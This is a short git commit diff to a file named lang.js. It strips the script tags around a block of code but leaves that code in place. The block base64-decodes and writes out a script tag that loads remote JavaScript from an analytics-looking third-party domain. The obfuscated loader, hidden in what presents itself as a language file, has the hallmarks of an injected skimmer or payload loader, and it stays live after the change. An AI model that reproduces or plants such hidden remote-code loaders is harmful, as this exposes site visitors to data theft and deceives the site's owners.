cbb8d56c74603057ffc0e71bd9c7b8a556271d84
version2 <57840254+version2@users.noreply.github.com>
2020-07-23 17:34:55 +0200

    Update lang.js

--- lang.js
+++ lang.js
@@ -1,5 +1,3 @@
-<script>
 var string = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8vYW5hbHl0aWNzLnNob3BzdGF0MS5jb20vZGF0ZWpzLmpzIj48L3NjcmlwdD4=';
 var decodedString = atob(string);
 document.write(''+ decodedString +'');
-</script>
